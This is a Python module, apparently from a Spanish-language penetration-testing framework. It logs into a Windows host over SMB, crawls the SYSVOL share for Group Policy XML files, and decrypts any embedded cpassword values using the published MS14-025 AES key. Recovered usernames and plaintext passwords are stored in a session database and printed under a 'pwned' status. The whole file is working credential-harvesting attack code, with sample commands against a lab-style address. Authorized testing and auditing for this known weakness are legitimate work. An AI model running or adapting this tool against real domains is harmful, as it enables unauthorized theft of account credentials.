# scripts/smb/enum/gpp_password.py

import os
import re
import base64
from Cryptodome.Cipher import AES

from scripts.base import BaseScript
from modules.smb import SMBModule
from core.output import print_result, print_table
from core import session_db

# Clave AES-256 publicada por Microsoft en el advisory MS14-025 ("Passwords
# in SYSVOL"). NO es secreta: es la misma clave usada por Windows para
# cifrar cpassword en todas las instalaciones, por eso el mecanismo está roto.
GPP_AES_KEY = bytes.fromhex(
    "4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b"
)

CPASSWORD_RE = re.compile(r'cpassword="([^"]+)"')
USERNAME_RE = re.compile(r'(?:userName|runAs|username)="([^"]+)"')


def _decrypt_cpassword(cpassword):
    padding = "=" * (-len(cpassword) % 4)
    try:
        raw = base64.b64decode(cpassword + padding)
    except Exception:
        return None

    if len(raw) % 16 != 0:
        return None

    try:
        cipher = AES.new(GPP_AES_KEY, AES.MODE_CBC, iv=b"\x00" * 16)
        decrypted = cipher.decrypt(raw)
    except Exception:
        return None

    pad_len = decrypted[-1]
    if 0 < pad_len <= 16:
        decrypted = decrypted[:-pad_len]

    try:
        return decrypted.decode("utf-16-le", errors="ignore").rstrip("\x00")
    except Exception:
        return None


class GPPPasswordScript(BaseScript):
    name = "gpp-password"
    description = "Busca y descifra contraseñas GPP (cpassword) en el share SYSVOL"

    examples = [
        {"flag": "(uso básico)",
         "desc": "Requiere login; una null session puede no tener permisos suficientes sobre SYSVOL",
         "good": "smb --script=gpp-password -t 10.129.1.5 -u iker -p 'Pass123!'",
         "bad": "smb --script=gpp-password -t 10.129.1.5  [sin -u, puede fallar el acceso a SYSVOL según la configuración]"},
    ]

    def run(self, **kwargs):
        smb = SMBModule(self.target, self.creds)

        if not smb.connect():
            return
        if not smb.login():
            return

        print_result("SMB", self.target.ip, "info",
                     "gpp-password: rastreando SYSVOL en busca de XML con cpassword...")

        downloaded = smb.spider_share("SYSVOL", extensions=[".xml"], max_depth=15)

        findings = []
        for local_path in downloaded:
            try:
                with open(local_path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
            except OSError:
                continue

            cpwd_match = CPASSWORD_RE.search(content)
            if not cpwd_match or not cpwd_match.group(1):
                continue

            plaintext = _decrypt_cpassword(cpwd_match.group(1))
            if not plaintext:
                continue

            user_match = USERNAME_RE.search(content)
            username = user_match.group(1) if user_match else "(desconocido)"

            findings.append((os.path.basename(local_path), username, plaintext))

            session_db.save_credential(self.target.ip, username, plaintext, "password",
                                        valid=False, source="gpp_password")
            session_db.save_finding(self.target.ip, "SMB", "gpp_password",
                                     f"{os.path.basename(local_path)} -> user={username}")

        if findings:
            print_table(f"Contraseñas GPP descifradas en {self.target.ip}",
                         ["Fichero", "Usuario", "Contraseña"], findings)
            print_result("SMB", self.target.ip, "pwned",
                         f"gpp-password: {len(findings)} credencial(es) descifrada(s) (sin validar aún)")
        else:
            print_result("SMB", self.target.ip, "info",
                         "gpp-password: no se encontraron cpassword en los XML descargados")
